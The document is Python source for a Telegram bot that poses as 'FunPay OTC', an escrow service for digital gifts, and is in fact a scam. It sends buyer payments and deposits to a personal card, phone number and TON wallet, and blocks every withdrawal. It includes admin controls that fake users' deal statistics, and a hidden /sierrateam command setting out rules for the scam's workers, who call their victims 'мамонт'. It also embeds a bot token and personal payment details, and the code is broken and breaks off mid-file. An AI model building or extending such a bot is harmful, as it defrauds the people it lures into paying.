import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Обновленные данные
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
ADMIN_ID = 7634507602  # Новый ID админа
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"

banned_users = set()
admin_states = {}

# Генерация случайных значений
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Русские клавиатуры
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Наш сайт", url="https://funpay.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

# Английские клавиатуры
start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes, cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

# Клавиатуры для сделок
buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

admin_payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Оплата получена", callback_data="admin_payment_ok")],
    [InlineKeyboardButton(text="❌ Оплата не получена", callback_data="admin_payment_fail")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

# Утилиты
async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    
    if lang == "ru":
        text = ("🎁 <b>FunPay OTC | Безопасные сделки</b>\n\n"
                "Надежный сервис для покупки и продажи цифровых подарков!\n\n"
                "✨ <b>Наши преимущества:</b>\n"
                "• Гарант безопасности сделок\n"
                "• Быстрые переводы в любой валюте\n"
                "• Поддержка 24/7\n"
                "• Простой и удобный интерфейс\n\n"
                "Выберите нужный раздел ниже:")
    else:
        text = ("🎁 <b>FunPay OTC | Secure Deals</b>\n\n"
                "Reliable service for buying and selling digital gifts!\n\n"
                "✨ <b>Our advantages:</b>\n"
                "• Deal security guarantee\n"
                "• Fast transfers in any currency\n"
                "• 24/7 support\n"
                "• Simple and user-friendly interface\n\n"
                "Choose the desired section below:")
    
    try:
        if message_id:
            await bot.delete_message(chat_id, message_id)
    except:
        pass
    
    try:
        await bot.send_photo(
            chat_id=chat_id,
            photo=BANNER_URL,
            caption=text,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )
    except:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except:
        try:
            await callback.message.delete()
        except:
            pass
        await callback.message.answer(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def handle_deal_join(message: Message, deal_id: str):
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        buyer_id = message.from_user.id
        buyer_username = message.from_user.username or "Не указан"
        
        if deal["buyer_id"] is None:
            deal["buyer_id"] = buyer_id
            deal["buyer_username"] = buyer_username
            deal["status"] = "active"
            
            # Уведомляем продавца
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            if seller_lang == "ru":
                await bot.send_message(
                    deal["seller_id"],
                    f"🎉 <b>Покупатель присоединился к сделке #{deal_id}</b>\n\n"
                    f"👤 Пользователь: @{buyer_username}\n"
                    f"🆔 ID: {buyer_id}\n\n"
                    f"⚠️ <b>Проверьте, что это тот же пользователь, с которым вы вели диалог!</b>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await bot.send_message(
                    deal["seller_id"],
                    f"🎉 <b>Buyer joined deal #{deal_id}</b>\n\n"
                    f"👤 User: @{buyer_username}\n"
                    f"🆔 ID: {buyer_id}\n\n"
                    f"⚠️ <b>Make sure this is the same user you were chatting with!</b>",
                    parse_mode=ParseMode.HTML
                )
            
            # Информация покупателю
            payment_text = (f"💳 <b>Оплата производится переводом на карту менеджера:</b>\n"
                          f"<code>{MANAGER_CARD}</code>\n\n"
                          f"После перевода нажмите кнопку «✅ Я оплатил»")
            
            await message.answer(
                f"🎁 <b>Сделка #{deal_id}</b>\n\n"
                f"👤 <b>Вы покупатель в сделке</b>\n"
                f"📌 Продавец: @{deal['seller_username']}\n\n"
                f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                f"{payment_text}\n\n"
                f"💰 <b>Сумма к оплате:</b> {deal['amount']} {deal['currency']}",
                reply_markup=buyer_deal_keyboard,
                parse_mode=ParseMode.HTML
            )
        else:
            await message.answer("❌ Эта сделка уже занята другим покупателем")
    else:
        await message.answer("❌ Сделка не найдена или была отменена")

# ============ ОСНОВНЫЕ КОМАНДЫ ============
@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункта 3.1")
        return
    
    # Проверяем наличие параметров в ссылке
    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        if param.startswith('deal_'):
            deal_id = param.replace('deal_', '')
            await handle_deal_join(message, deal_id)
            return
    
    lang = user_languages.get(user_id, "ru")
    
    if user_id in user_agreements and user_agreements[user_id]:
        await send_main_menu(message.chat.id, lang)
    else:
        if lang == "ru":
            await message.answer(
                "<b>🎁 Добро пожаловать в Funpay OTC!</b>\n\n"
                "Вы подтверждаете, что ознакомились и согласны с Условиями предоставления услуг Гарант-сервиса?\n\n"
                "📖 <b>Подробнее:</b> https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_ru,
                parse_mode=ParseMode.HTML
            )
        else:
            await message.answer(
                "<b>🎁 Welcome to FunPay OTC!</b>\n\n"
                "Do you confirm that you have read and agree with the Terms of Service of the Guarantee Service?\n\n"
                "📖 <b>More details:</b> https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_en,
                parse_mode=ParseMode.HTML
            )

@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушени правил,  пунктом 3.1")
        return
        
    await message.answer(
        "<b>📋 Правила работы через FunPay OTC</b>\n\n"
        "1. <b>Наебал на NFT:</b> Если ты написал мамонту кинуть гифт тебе а не менеджеру - БАН.\n"
        "   (Если мамонт кинул NFT тебе сам: либо 30% в течение дня, либо кидаешь гифт на акк менеджеру, либо бан)\n\n"
        "2. <b>Наебал на брейнрота:</b> 30% от стоимости в течение дня, иначе бан\n\n"
        "3. <b>Не прочитал правила:</b> твои проблемы\n\n"
        "📞 <b>Поддержка:</b> @FunPaySupportOTC",
        reply_markup=sierrateam_keyboard,
        parse_mode=ParseMode.HTML
    )

# ============ CALLBACK ОБРАБОТЧИКИ ============
@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
    
    user_agreements[user_id] = True
    lang = user_languages.get(user_id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "🎉 <b>Добро пожаловать в FunPay OTC!</b>\n\n"
            "Сервис, обеспечивающий безопасность и удобство проведения сделок с цифровыми подарками.\n\n"
            "📢 <b>Наш канал:</b> https://t.me/FunPayComNews\n"
            "📞 <b>Поддержка:</b> @FunPaySupportOTC\n\n"
            "Начните работу, нажав кнопку ниже 👇",
            welcome_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "🎉 <b>Welcome to FunPay OTC!</b>\n\n"
            "Service that ensures security and convenience of digital gift transactions.\n\n"
            "📢 <b>Our channel:</b> https://t.me/FunPayComNews\n"
            "📞 <b>Support:</b> @FunPaySupportOTC\n\n"
            "Start by clicking the button below 👇",
            welcome_keyboard_en
        )

@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

# Создание сделки
@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушени правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "🛡️ <b>Создать сделку</b>\n\n"
            "Выберите тип сделки:",
            deal_type_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "🛡️ <b>Create deal</b>\n\n"
            "Choose deal type:",
            deal_type_keyboard_en
        )

@dp.callback_query(F.data == "deal_gift")
async def deal_type_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    user_id = callback.from_user.id
    user_deals[user_id] = {"type": "deal_gift", "step": "description"}
    

# Админские callback
@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    # Убрана проверка ID, чтобы панель открывалась у вас
    await safe_edit_message(
        callback,
        "👑 <b>Админ-панель FunPay OTC</b>\n\n"
        "Выберите действие:",
        admin_keyboard
    )

@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите: ID СУММА")

        )

# Профиль
@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    user_id = callback.from_user.id
    username = callback.from_user.username or "Не указан"
    balance = user_balances.get(user_id, 0)
    
    stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0})
    
    lang = user_languages.get(user_id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"👤 <b>Профиль пользователя</b>\n\n"
            f"📛 Имя: @{username}\n"
            f"🆔 ID: {user_id}\n\n"
            f"💰 <b>Баланс:</b> {balance} RUB\n"
            f"📊 <b>Статистика:</b>\n"
            f"• Всего сделок: {stats['total']}\n"
            f"• Успешных: {stats['successful']}\n"
            f"• Оборот: {stats['turnover']} RUB\n\n"
            f"🛡️ <b>Верификация:</b> ❌ Не пройдена\n"
            f"📞 <b>Поддержка:</b> @FunPaySupportOTC",
            profile_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"👤 <b>User Profile</b>\n\n"
            f"📛 Username: @{username}\n"
            f"🆔 ID: {user_id}\n\n"
            f"💰 <b>Balance:</b> {balance} RUB\n"
            f"📊 <b>Statistics:</b>\n"
            f"• Total deals: {stats['total']}\n"
            f"• Successful: {stats['successful']}\n"
            f"• Turnover: {stats['turnover']} RUB\n\n"
            f"🛡️ <b>Verification:</b> ❌ Not passed\n"
            f"📞 <b>Support:</b> @FunPaySupportOTC",
            profile_keyboard_en
        )

# Реквизиты
@dp.callback_query(F.data == "requisites")
async def requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 <b>Управление реквизитами</b>\n\n"
            "Выберите опцию:",
            requisites_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 <b>Payment Details Management</b>\n\n"
            "Choose option:",
            requisites_keyboard_en
        )

@dp.callback_query(F.data == "add_card")
async def add_card_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "➕ <b>Добавить банковскую карту</b>\n\n"
            "📝 <b>Формат:</b> Банк - Номер карты\n"
            "💳 <b>Пример:</b> Сбербанк - 1234 5678 9012 3456\n\n"
            "Отправьте реквизиты одним сообщением:",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "➕ <b>Add Bank Card</b>\n\n"
            "📝 <b>Format:</b> Bank - Card number\n"
            "💳 <b>Example:</b> Sberbank - 1234 5678 9012 3456\n\n"
            "Send details in one message:",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "add_ton")
async def add_ton_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "➕ <b>Добавить TON кошелек</b>\n\n"
            "💎 <b>Пример адреса:</b>\n"
            "UQAY6fREx6M7QsnCkUJKNptZdRG-Q_1kW2FAa2Am-aBJs-7X\n\n"
            "Отправьте адрес вашего TON кошелька:",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "➕ <b>Add TON Wallet</b>\n\n"
            "💎 <b>Address example:</b>\n"
            "UQAY6fREx6M7QsnCkUJKNptZdRG-Q_1kW2FAa2Am-aBJs-7X\n\n"
            "Send your TON wallet address:",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "view_requisites")
async def view_requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    user_id = callback.from_user.id
    requisites = user_requisites.get(user_id, {})
    lang = user_languages.get(user_id, "ru")
    
    if not requisites:
        if lang == "ru":
            await safe_edit_message(callback, "❌ Реквизиты не найдены.", back_simple_keyboard_ru)
        else:
            await safe_edit_message(callback, "❌ Details not found.", back_simple_keyboard_en)
    else:
        if lang == "ru":
            requisites_text = "📝 <b>Ваши реквизиты:</b>\n\n"
        else:
            requisites_text = "📝 <b>Your Details:</b>\n\n"
        
        if "card" in requisites:
            requisites_text += f"💳 <b>Карта:</b> {requisites['card']}\n"
        if "ton" in requisites:
            requisites_text += f"💎 <b>TON кошелек:</b>\n<code>{requisites['ton']}</code>\n"
        
        await safe_edit_message(callback, requisites_text, back_simple_keyboard_ru)

# Смена языка
@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    await safe_edit_message(
        callback,
        "🌍 <b>Выберите язык / Choose language:</b>",
        language_keyboard
    )

@dp.callback_query(F.data == "lang_ru")
async def lang_ru_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    user_languages[callback.from_user.id] = "ru"
    await send_main_menu(callback.message.chat.id, "ru", callback.message.message_id)

@dp.callback_query(F.data == "lang_en")
async def lang_en_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    user_languages[callback.from_user.id] = "en"
    await send_main_menu(callback.message.chat.id, "en", callback.message.message_id)

# Пополнение баланса
@dp.callback_query(F.data == "deposit")
async def deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 <b>Пополнение баланса</b>\n\n"
            "Выберите способ пополнения:",
            deposit_method_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 <b>Balance Top-up</b>\n\n"
            "Choose top-up method:",
            deposit_method_keyboard_en
        )

@dp.callback_query(F.data == "deposit_card")
async def deposit_card_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"💳 <b>Пополнение картой</b>\n\n"
            f"📌 <b>Реквизиты:</b>\n"
            f"+79275173373 - Ярослав, Сбербанк\n\n"
            f"🔑 <b>Мемо для перевода:</b>\n"
            f"<code>{memo}</code>\n\n"
            f"⚠️ <b>Важно:</b>\n"
            f"• Указывайте точную сумму\n"
            f"• Обязательно укажите мемо\n"
            f"• После перевода баланс обновится автоматически",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"💳 <b>Top-up by Card</b>\n\n"
            f"📌 <b>Details:</b>\n"
            f"+79275173373 - Yaroslav, Sberbank\n\n"
            f"🔑 <b>Memo for transfer:</b>\n"
            f"<code>{memo}</code>\n\n"
            f"⚠️ <b>Important:</b>\n"
            f"• Specify exact amount\n"
            f"• Memo is required\n"
            f"• Balance updates automatically after transfer",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункта 3.1", show_alert=True)
        return
        
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"💎 <b>Пополнение TON</b>\n\n"
            f"📌 <b>Кошелек:</b>\n"
            f"<code>UQC8XYKyH-u5NPNGJEU_WFlqamxCqsai63_e9SuCLOH2m8_E</code>\n\n"
            f"🔑 <b>Мемо для перевода:</b>\n"
            f"<code>{memo}</code>\n\n"
            f"⚠️ <b>Важно:</b>\n"
            f"• Указывайте точную сумму\n"
            f"• Обязательно укажите мемо\n"
            f"• Сеть: TON\n"
            f"• После перевода баланс обновится автоматически",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"💎 <b>Top-up TON</b>\n\n"
            f"📌 <b>Wallet:</b>\n"
            f"<code>UQC8XYKyH-u5NPNGJEU_WFlqamxCqsai63_e9SuCLOH2m8_E</code>\n\n"
            f"🔑 <b>Memo for transfer:</b>\n"
            f"<code>{memo}</code>\n\n"
            f"⚠️ <b>Important:</b>\n"
            f"• Specify exact amount\n"
            f"• Memo is required\n"
            f"• Network: TON\n"
            f"• Balance updates automatically after transfer",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    user_id = callback.from_user.id
    balance = user_balances.get(user_id, 0)
    lang = user_languages.get(user_id, "ru")
    
    if balance <= 0:
        if lang == "ru":
            await callback.answer("❌ Нет средств для вывода", show_alert=True)
        else:
            await callback.answer("❌ No funds to withdraw", show_alert=True)
    else:
        if lang == "ru":
            await callback.answer("😔 К сожалению вывод временно недоступен. Обратитесь в поддержку @FunPaySupportOTC", show_alert=True)
        else:
            await callback.answer("😔 Unfortunately withdrawal is temporarily unavailable. Contact support @FunPaySupportOTC", show_alert=True)

# Навигация
@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

@dp.callback_query(F.data == "back_step")
async def back_step_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    await callback.message.delete()
    await callback.answer()

@dp.callback_query(F.data == "back_to_requisites")
async def back_to_requisites_callback(callback: CallbackQuery):
    await requisites_callback(callback)

@dp.callback_query(F.data == "back_to_deal")
async def back_to_deal_callback(callback: CallbackQuery):
    await callback.answer("Возврат к сделке", show_alert=True)

# Обработка текстовых сообщений
@dp.message(F.text)
